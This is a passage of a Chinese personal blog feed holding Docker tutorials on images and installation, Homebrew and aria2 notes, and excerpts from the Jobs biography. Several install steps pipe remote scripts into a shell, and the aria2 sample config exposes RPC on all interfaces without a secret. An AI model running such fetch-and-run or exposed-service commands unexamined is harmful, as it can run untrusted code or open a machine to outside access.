列表中的镜像体积总和并非是所有镜像实际硬盘消耗。由于 Docker 镜像是多层存储结构，并且可以继承、复用，因此不同镜像可能会因为使用相同的基础镜像，从而拥有共同的层。由于 Docker 使用 Union FS，相同的层只需要保存一份即可，因此实际镜像硬盘占用空间很可能要比这个列表镜像大小的总和要小的多。</p><p>你可以通过 <code>docker system df</code> 命令来便捷的查看镜像、容器、数据卷所占用的空间。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker system dfTYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLEImages          3         2         180.5MB   138.7MB (76%)Containers      2         0         1.114kB   1.114kB (100%)Local Volumes   1         1         10.24MB   0B (0%)Build Cache     32        0         395MB     395MB</code></pre></div><h4 id="虚悬镜像"><a href="#虚悬镜像" class="headerlink" title="虚悬镜像"></a>虚悬镜像</h4><p>此外有时还可以看到一个特殊的镜像，这个镜像既没有仓库名，也没有标签，均为 <code>&lt;none&gt;</code>。：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&lt;none&gt;               &lt;none&gt;              00285df0df87        5 days ago          342 MB</code></pre></div><p>这个镜像原本是有镜像名和标签的，原来为 <code>mongo:3.2</code>，随着官方镜像维护，发布了新版本后，重新 <code>docker pull mongo:3.2</code> 时，<code>mongo:3.2</code> 这个镜像名被转移到了新下载的镜像身上，而旧的镜像上的这个名称则被取消，从而成为了 <code>&lt;none&gt;</code>。除了 <code>docker pull</code> 可能导致这种情况，<code>docker build</code> 也同样可以导致这种现象。由于新旧镜像同名，旧镜像名称被取消，从而出现仓库名、标签均为 <code>&lt;none&gt;</code> 的镜像。这类无标签镜像也被称为 <strong>虚悬镜像(dangling image)</strong> ，可以用下面的命令专门显示这类镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image ls -f dangling&#x3D;trueREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE&lt;none&gt;              &lt;none&gt;              00285df0df87        5 days ago          342 MB</code></pre></div><p>一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image prune</code></pre></div><h4 id="中间层镜像"><a href="#中间层镜像" class="headerlink" title="中间层镜像"></a>中间层镜像</h4><p>为了加速镜像构建、重复利用资源，Docker 会利用 <strong>中间层镜像</strong>。所以在使用一段时间后，可能会看到一些依赖的中间层镜像。默认的 <code>docker image ls</code> 列表中只会显示顶层镜像，如果希望显示包括中间层镜像在内的所有镜像的话，需要加 <code>-a</code> 参数。</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">$ docker image ls -a</code></pre></div><p>这些镜像在<code>-a</code>列出来后也无标签，但平时无需处理。删除依赖中间层镜像的镜像后，这些依赖的中间层镜像也会被连带删除。</p><h4 id="列出部分镜像"><a href="#列出部分镜像" class="headerlink" title="列出部分镜像"></a>列出部分镜像</h4><p>不加任何参数的情况下，<code>docker image ls</code> 会列出所有顶层镜像，但是有时候我们只希望列出部分镜像。<code>docker image ls</code> 有好几个参数可以帮助做到这个事情。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 根据仓库名列出镜像$ docker image ls ubuntuREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEubuntu              18.04               329ed837d508        3 days ago          63.3MBubuntu              bionic              329ed837d508        3 days ago          63.3MB# 列出特定的某个镜像，也就是说指定仓库名和标签$ docker image ls ubuntu:18.04REPOSITORY          TAG                 IMAGE ID            CREATED             SIZEubuntu              18.04               329ed837d508        3 days ago          63.3MB# 除此以外，&#96;docker image ls&#96; 还支持强大的过滤器参数 &#96;--filter&#96;，或者简写 &#96;-f&#96;# 比如，之前查看虚悬镜像，或我们希望看到在 &#96;mongo:3.2&#96; 之后建立的镜像，可以用下面的命令：$ docker image ls -f since&#x3D;mongo:3.2REPOSITORY          TAG                 IMAGE ID            CREATED             SIZEredis               latest              5f515359c7f8        5 days ago          183 MBnginx               latest              05a60462f8ba        5 days ago          181 MB# 想查看某个位置之前的镜像也可以，只需要把 &#96;since&#96; 换成 &#96;before&#96; 即可。# 此外，如果镜像构建时，定义了 &#96;LABEL&#96;，还可以通过 &#96;LABEL&#96; 来过滤。$ docker image ls -f label&#x3D;com.example.version&#x3D;0.1...</code></pre></div><h5 id="以特定格式显示"><a href="#以特定格式显示" class="headerlink" title="以特定格式显示"></a>以特定格式显示</h5><p>比如，下面的命令会直接列出镜像结果，并且只包含镜像ID和仓库名：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image ls --format &quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;5f515359c7f8: redis05a60462f8ba: nginxfe9198c04d62: mongo00285df0df87: &lt;none&gt;329ed837d508: ubuntu329ed837d508: ubuntu</code></pre></div><p>或者打算以表格等距显示，并且有标题行，和默认一样，不过自己定义列：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image ls --format &quot;table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag&#125;&#125;&quot;IMAGE ID            REPOSITORY          TAG5f515359c7f8        redis               latest05a60462f8ba        nginx               latestfe9198c04d62        mongo               3.200285df0df87        &lt;none&gt;              &lt;none&gt;329ed837d508        ubuntu              18.04329ed837d508        ubuntu              bionic</code></pre></div><h3 id="3-删除本地镜像"><a href="#3-删除本地镜像" class="headerlink" title="3. 删除本地镜像"></a>3. 删除本地镜像</h3><p>如果要删除本地的镜像，可以使用 <code>docker image rm</code> 命令，其格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...]</code></pre></div><h4 id="用-ID、镜像名、摘要删除镜像"><a href="#用-ID、镜像名、摘要删除镜像" class="headerlink" title="用 ID、镜像名、摘要删除镜像"></a>用 ID、镜像名、摘要删除镜像</h4><p>其中，<code>&lt;镜像&gt;</code> 可以是 <code>镜像短 ID</code>、<code>镜像长 ID</code>、<code>镜像名</code> 或者 <code>镜像摘要</code>。</p><p>比如我们有这么一些镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image lsREPOSITORY    TAG       IMAGE ID       CREATED       SIZEhello-world   latest    d1165f221234   2 weeks ago   13.3kB</code></pre></div><p>我们可以用镜像的完整 ID，也称为 <code>长 ID</code>，来删除镜像。使用脚本的时候可能会用长 ID，但是人工输入就太累了，所以更多的时候是用 <code>短 ID</code> 来删除镜像。<code>docker image ls</code> 默认列出的就已经是短 ID 了，一般取前3个字符以上，只要足够区分于别的镜像就可以了。</p><p>比如这里，如果我们要删除 <code>redis:alpine</code> 镜像，可以执行：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm d11Untagged: hello-world:latestUntagged: hello-world@sha256:f1ed3708f538b537eb9c2a7dd50dc90a706f7debd7e1196c9264edeea521a86dDeleted: sha256:d11ad78535f015d88872e13fa87a828425117e3d28075d0c117932b05bf189b7Deleted: sha256:96167737e29ca8e9d74982ef2a0dda76ed7b430da55e321c071f0dbff8c2899bDeleted: sha256:32770d1dcf835f192cafd6b9263b7b597a1778a403a109e2cc2ee866f74adf23Deleted: sha256:127227698ad74a5846ff5153475e03439d96d4b1c7f2a449c7a826ef74a2d2faDeleted: sha256:1333ecc582459bac54e1437335c0816bc17634e131ea0cc48daa27d32c75eab3Deleted: sha256:4fc455b921edf9c4aea207c51ab39b10b06540c8b4825ba57b3feed1668fa7c7</code></pre></div><p>我们也可以用<code>镜像名</code>，也就是 <code>&lt;仓库名&gt;:&lt;标签&gt;</code>，来删除镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm hello-worldUntagged: hello-world:latestUntagged: hello-world@sha256:f1ed3708f538b537eb9c2a7dd50dc90a706f7debd7e1196c9264edeea521a86dDeleted: sha256:0584b3d2cf6d235ee310cf14b54667d889887b838d3f3d3033acd70fc3c48b8aDeleted: sha256:97ca462ad9eeae25941546209454496e1d66749d53dfa2ee32bf1faabd239d38</code></pre></div><h4 id="Untagged-和-Deleted"><a href="#Untagged-和-Deleted" class="headerlink" title="Untagged 和 Deleted"></a>Untagged 和 Deleted</h4><p>如果观察上面这几个命令的运行输出信息的话，你会注意到删除行为分为两类，一类是 <code>Untagged</code>，另一类是 <code>Deleted</code>。我们之前介绍过，镜像的唯一标识是其 ID 和摘要，而一个镜像可以有多个标签。</p><p>因此当我们使用上面命令删除镜像的时候，实际上是在要求删除某个标签的镜像。当该镜像所有的标签都被取消了，该镜像很可能会失去了存在的意义，因此会触发删除行为。</p><p>镜像是多层存储结构，因此在删除的时候也是从上层向基础层方向依次进行判断删除。镜像的多层结构让镜像复用变得非常容易，因此很有可能某个其它镜像正依赖于当前镜像的某一层。这种情况，依旧不会触发删除该层的行为。直到没有任何层依赖当前层时，才会真实的删除当前层。</p><p>除了镜像依赖以外，还需要注意的是容器对镜像的依赖。如果有用这个镜像启动的容器存在（即使容器没有运行），那么同样不可以删除这个镜像。如果这些容器是不需要的，应该先将它们删除，然后再来删除镜像。</p><h4 id="用-docker-image-ls-命令来配合"><a href="#用-docker-image-ls-命令来配合" class="headerlink" title="用 docker image ls 命令来配合"></a>用 docker image ls 命令来配合</h4><p>像其它可以承接多个实体的命令一样，可以使用 <code>docker image ls -q</code> 来配合使用 <code>docker image rm</code>，这样可以成批的删除希望删除的镜像。我们在“镜像列表”章节介绍过很多过滤镜像列表的方式都可以拿过来使用。</p><p>比如，我们需要删除所有仓库名为 <code>redis</code> 的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm $(docker image ls -q redis)</code></pre></div><p>或者删除所有在 <code>mongo:3.2</code> 之前的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm $(docker image ls -q -f before&#x3D;mongo:3.2)</code></pre></div><p>充分利用你的想象力和 Linux 命令行的强大，你可以完成很多非常赞的功能。</p><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Image</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——概念与安装</title>
    <link href="/posts/adb8e54e/"/>
    <url>/posts/adb8e54e/</url>
    
    <content type="html"><![CDATA[<h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念</h2><p>Docker主要包括三个概念<strong>镜像</strong>、<strong>容器</strong>、<strong>仓库</strong>。</p><h3 id="镜像（Image）"><a href="#镜像（Image）" class="headerlink" title="镜像（Image）"></a><strong>镜像</strong>（<code>Image</code>）</h3><p>我们都知道，操作系统分为 <strong>内核</strong> 和 <strong>用户空间</strong>。对于 <code>Linux</code> 而言，内核启动后，会挂载 <code>root</code> 文件系统为其提供用户空间支持。而 <strong>Docker 镜像</strong>（<code>Image</code>），就相当于是一个 <code>root</code> 文件系统。比如官方镜像 <code>ubuntu:18.04</code> 就包含了完整的一套 Ubuntu 18.04 最小系统的 <code>root</code> 文件系统。</p><p><strong>Docker 镜像</strong> 是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像 <strong>不包含</strong> 任何动态数据，其内容在构建之后也不会被改变。</p><h3 id="容器（Container）"><a href="#容器（Container）" class="headerlink" title="容器（Container）"></a><strong>容器</strong>（<code>Container</code>）</h3><p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 <a href="https://en.wikipedia.org/wiki/Linux_namespaces">命名空间</a>。因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。</p><h3 id="仓库（Repository）"><a href="#仓库（Repository）" class="headerlink" title="仓库（Repository）"></a><strong>仓库</strong>（<code>Repository</code>）</h3><p>镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，<a href="">Docker Registry</a> 就是这样的服务。</p><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库</strong>（<code>Repository</code>）；每个仓库可以包含多个 <strong>标签</strong>（<code>Tag</code>）；每个标签对应一个镜像。</p><p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <code>&lt;仓库名&gt;:&lt;标签&gt;</code> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <code>latest</code> 作为默认标签。</p><h3 id="Docker与传统虚拟化区别"><a href="#Docker与传统虚拟化区别" class="headerlink" title="Docker与传统虚拟化区别"></a>Docker与传统虚拟化区别</h3><p><img src="/image/Docker%E5%AE%9E%E8%B7%B5%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%AE%89%E8%A3%85/virtualization.png" alt="virtualization"></p><p><img src="/image/Docker%E5%AE%9E%E8%B7%B5%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%AE%89%E8%A3%85/docker.png" alt="docker"></p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2 安装"></a>2 安装</h2><h3 id="2-1-Ubuntu下安装"><a href="#2-1-Ubuntu下安装" class="headerlink" title="2.1 Ubuntu下安装"></a>2.1 Ubuntu下安装</h3><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get remove docker docker-engine docker.io</code></pre></div><h4 id="向-sources-list-中添加-Docker-软件源"><a href="#向-sources-list-中添加-Docker-软件源" class="headerlink" title="向 sources.list 中添加 Docker 软件源"></a>向 <code>sources.list</code> 中添加 Docker 软件源</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \  $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null# 官方源# echo \#   &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu \# $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null</code></pre></div><blockquote><p>以上命令会添加稳定版本的 Docker APT 镜像源，如果需要测试版本的 Docker 请将 stable 改为 test。</p></blockquote><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre></div><h4 id="使用脚本自动安装"><a href="#使用脚本自动安装" class="headerlink" title="使用脚本自动安装"></a>使用脚本自动安装</h4><p>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装，另外可以通过 <code>--mirror</code> 选项使用国内源进行安装：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># curl -fsSL test.docker.com -o get-docker.shcurl -fsSL get.docker.com -o get-docker.shsudo sh get-docker.sh --mirror Aliyun# sudo sh get-docker.sh --mirror AzureChinaCloud</code></pre></div><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo systemctl enable dockersudo systemctl start docker</code></pre></div><h4 id="建立-docker-用户组"><a href="#建立-docker-用户组" class="headerlink" title="建立 docker 用户组"></a>建立 docker 用户组</h4><p>默认情况下，<code>docker</code> 命令会使用 <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix socket</a> 与 Docker 引擎通讯。而只有 <code>root</code> 用户和 <code>docker</code> 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 <code>root</code> 用户。因此，更好地做法是将需要使用 <code>docker</code> 的用户加入 <code>docker</code> 用户组。</p><p>建立 <code>docker</code> 组：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo groupadd docker</code></pre></div><p>将当前用户加入 <code>docker</code> 组：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo usermod -aG docker $USER</code></pre></div><p>退出当前终端并重新登录，进行如下测试。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run --rm hello-world</code></pre></div><p>若能正常输出以上信息，则说明安装成功。</p><h3 id="2-2-MacOS下安装"><a href="#2-2-MacOS下安装" class="headerlink" title="2.2 MacOS下安装"></a>2.2 MacOS下安装</h3><p>使用brew即可进行快速安装</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew install --cask docker</code></pre></div><p>如果 <code>docker version</code>、<code>docker info</code> 都正常的话，可以尝试运行一个 <a href="https://hub.docker.com/_/nginx/">Nginx 服务器</a>：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run -d -p 80:80 --name webserver nginx</code></pre></div><p>服务运行后，可以访问 <a href="http://localhost/">http://localhost</a>，如果看到了 “Welcome to nginx!”，就说明 Docker Desktop for Mac 安装成功了。</p><h3 id="2-3-镜像加速"><a href="#2-3-镜像加速" class="headerlink" title="2.3 镜像加速"></a>2.3 镜像加速</h3><p>aliyun：<a href="https://www.aliyun.com/product/acr?source=5176.11533457&userCode=8lx5zmtu">阿里云加速器(点击管理控制台 -&gt; 登录账号(淘宝账号) -&gt; 左侧镜像中心 -&gt; 镜像加速器 -&gt; 复制地址)</a></p><p>DaoCloud：<a href="http://f1361db2.m.daocloud.io/">http://f1361db2.m.daocloud.io</a></p><ul><li>Ubuntu</li></ul><p>可在 <code>/etc/docker/daemon.json</code> 中写入如下内容（如果文件不存在请新建该文件）：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123;  &quot;registry-mirrors&quot;: [    &quot;https:&#x2F;&#x2F;hub-mirror.c.163.com&quot;,    &quot;https:&#x2F;&#x2F;mirror.baidubce.com&quot;  ]&#125;</code></pre></div><p>也可使用DaoCloud服务提供的一键换镜像站脚本：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;daotools&#x2F;set_mirror.sh | sh -s http:&#x2F;&#x2F;f1361db2.m.daocloud.io</code></pre></div><p>之后重新启动服务。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo systemctl daemon-reloadsudo systemctl restart docker</code></pre></div><ul><li>macOS</li></ul><p>对于使用 macOS 的用户，在任务栏点击 Docker Desktop 应用图标 -&gt; <code>Perferences</code>，在左侧导航菜单选择 <code>Docker Engine</code>，在右侧像上述Ubuntu中json一样编辑 json 文件。修改完成之后，点击 <code>Apply &amp; Restart</code> 按钮，Docker 就会重启并应用配置的镜像地址了。</p><ul><li>检查加速器生效</li></ul><p>执行<code>docker info</code>，若在结果中看到了如下则生效：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">Registry Mirrors: https:&#x2F;&#x2F;5503mc71.mirror.aliyuncs.com&#x2F;</code></pre></div><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p><p><a href="https://www.daocloud.io/mirror#accelerator-doc">https://www.daocloud.io/mirror#accelerator-doc</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Ubuntu</tag>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>brew权限问题与Mac使用指定程序打开</title>
    <link href="/posts/1ffeecc0/"/>
    <url>/posts/1ffeecc0/</url>
    
    <content type="html"><![CDATA[<h3 id="Mac命令行指定特定程序打开文件-a"><a href="#Mac命令行指定特定程序打开文件-a" class="headerlink" title="Mac命令行指定特定程序打开文件 -a"></a>Mac命令行指定特定程序打开文件 -a</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">open -a &#x2F;Applications&#x2F;Sublime\ Text.app&#x2F; httpd.conf</code></pre></div><h3 id="brew-Permission-Denied-问题解决"><a href="#brew-Permission-Denied-问题解决" class="headerlink" title="brew Permission Denied 问题解决"></a>brew <strong>Permission Denied</strong> 问题解决</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo chown -R $(whoami) &#x2F;usr&#x2F;local</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>HomeBrew</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>aria2与Homebrew简记</title>
    <link href="/posts/e8d82254/"/>
    <url>/posts/e8d82254/</url>
    
    <content type="html"><![CDATA[<h3 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h3><blockquote><p><a href="https://aria2.github.io/">aria2</a>是一个自由、开源、轻量级多协议和多源的命令行下载工具，它支持 HTTP/HTTPS、FTP、SFTP、 BitTorrent 和 Metalink 协议。</p><p>brew install aria2</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 下载单个文件（支持使用种子文件与磁力链接）aria2c https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2# 下载多个文件aria2c -Z https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2 https:&#x2F;&#x2F;y&#x2F;owncloud-9.0.0.tar.bz2# 另存文件名字aria2c -o owncloud.zip https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2# 续传未完成的下载（中断使用.aria2后缀保存文件，下次重启任务后续传）aria2c -c https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2# 从文件获取输入（可传入URL列表）aria2c -i test-aria2.txt# 其他-D 后台下载--conf-path&#x3D;&quot;~&#x2F;.aria2&#x2F;aria2.conf&quot; 配置文件-s 设置线程数-max-download-limit 设置最大下载速度-x3 到服务器的连接数--http-user&#x3D;xxx --http-password&#x3D;xxx http密码下载--ftp-user&#x3D;xxx --ftp-password&#x3D;xxx ftp密码下载</code></pre></div><p>配置文件可参考：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#用户名#rpc-user&#x3D;user#密码#rpc-passwd&#x3D;passwd#上面的认证方式不建议使用,建议使用下面的token方式#设置加密的密钥#rpc-secret&#x3D;token#允许rpcenable-rpc&#x3D;true#允许所有来源, web界面跨域权限需要rpc-allow-origin-all&#x3D;true#允许外部访问，false的话只监听本地端口rpc-listen-all&#x3D;true#RPC端口, 仅当默认端口被占用时修改#rpc-listen-port&#x3D;6800#最大同时下载数(任务数), 路由建议值: 3max-concurrent-downloads&#x3D;5#断点续传continue&#x3D;true#同服务器连接数max-connection-per-server&#x3D;5#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要min-split-size&#x3D;10M#单文件最大线程数, 路由建议值: 5split&#x3D;10#下载速度限制max-overall-download-limit&#x3D;0#单文件速度限制max-download-limit&#x3D;0#上传速度限制max-overall-upload-limit&#x3D;0#单文件速度限制max-upload-limit&#x3D;0#断开速度过慢的连接#lowest-speed-limit&#x3D;0#验证用，需要1.16.1之后的release版本#referer&#x3D;*#文件保存路径, 默认为当前启动位置dir&#x3D;&#x2F;Users&#x2F;xxx&#x2F;Downloads#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本#disk-cache&#x3D;0#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)#enable-mmap&#x3D;true#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长#所需时间 none &lt; falloc ? trunc « prealloc, falloc和trunc需要文件系统和内核支持file-allocation&#x3D;prealloc</code></pre></div><p>设置WebUI可参考<a href="https://ziahamza.github.io/webui-aria2/">链接</a>。</p><h3 id="HomeBrew"><a href="#HomeBrew" class="headerlink" title="HomeBrew"></a>HomeBrew</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">## 管理HomeBrew# 安装 HomeBrew&#x2F;usr&#x2F;bin&#x2F;ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot;# 卸载 HomeBrewruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;uninstall)&quot;# 更新 HomeBrewbrew update# 检视HomeBrewbrew doctor## 管理软件# 安装卸载更新软件brew install wgetbrew uninstall wgetbrew uograde wget# 列出安装的软件brew list# 列出安装的软件信息brew info wget# 检查软件库brew search wget## 管理服务# 列出服务brew services list# 注销未使用服务brew services cleanup# 运行服务（不注册为跟随系统启动）brew services run nginx# 运行后台服务（注册为跟随系统启动）brew services start nginx# 暂停并注销服务brew services stop nginx# 重启并注册服务brew services restart nginx</code></pre></div><blockquote><p>参考：</p><p><a href="https://wild-flame.github.io/guides/docs/mac-os-x-setup-guide/aria_2/readme">https://wild-flame.github.io/guides/docs/mac-os-x-setup-guide/aria_2/readme</a></p><p><a href="https://www.linuxprobe.com/aria2-download.html">https://www.linuxprobe.com/aria2-download.html</a></p><p><a href="https://segmentfault.com/a/1190000018928643">https://segmentfault.com/a/1190000018928643</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>aria2</tag>
      
      <tag>Homebrew</tag>
      
      <tag>Terminal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《史蒂夫·乔布斯传》摘录</title>
    <link href="/posts/eed80891/"/>
    <url>/posts/eed80891/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《史蒂夫·乔布斯传》沃尔特·艾萨克森</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="# 1"></a># 1</h3><p>一个具有强烈个性的人身上集合了人文和科学的天赋后所能产生的那种创造力，我相信这种创造力也是在21世纪建立创新型经济的关键因素。</p><h3 id="2"><a href="#2" class="headerlink" title="# 2"></a># 2</h3><p>“有些人认为，因为我被亲生父母抛弃过，所以我非常努力地工作以求出人头地，这样我父母就会后悔当初的决定，还有一些类似的言论，都太荒谬了。”他坚称，“知道自己是被领养的也许让我感觉更加独立，但我从未感觉自己被抛弃过。我一直都觉得自己很特别。我的父母让我觉得自己很特别。”之后，每当有人称保罗和克拉拉为乔布斯的”养父母“或者暗示他俩不是他的”亲生父母“时，乔布斯就会异常愤怒。”他们百分之一千是我的父母。“他说。另一方面，当谈及他的亲生父母时，他显得很草率：“他们就是我的精子库和卵子库，这话并不过分，因为这就是事实，他们扮演的就是精子库的角色，仅此而已。”</p><blockquote><p>生活中确有的亲情，在内心的感受上要比血脉的相连来的更为直接。</p><p>或许随着年龄的生长才会越加注意血脉带来的感受吧。</p></blockquote><h3 id="3"><a href="#3" class="headerlink" title="# 3"></a># 3</h3><p>​        宗教应该更多地强调精神体验，而不是一味遵守教条。“<strong>当基督教太过基于信仰，而忽略了以耶稣的生活方式或者从耶稣的角度看世界时，他的精髓就消失了，</strong>”他告诉我，“我觉得不同的宗教就好比通往同一栋房子的不同的门。有时候我觉得这栋房子存在，有时候我又觉得它不存在。这是最神秘的。”</p><h3 id="4"><a href="#4" class="headerlink" title="# 4"></a># 4</h3><p><strong>求知若饥，虚心若愚。</strong></p><p><strong>Stay hungry, Stay foolish.</strong></p><h3 id="5"><a href="#5" class="headerlink" title="# 5"></a># 5</h3><p>苦行和极简将会让人更加敏锐。“他相信匮乏即是富足，自律产生喜悦。”她说，“他知道一个大多数人不知道的道理：物极必反。”</p><h3 id="6"><a href="#6" class="headerlink" title="# 6"></a># 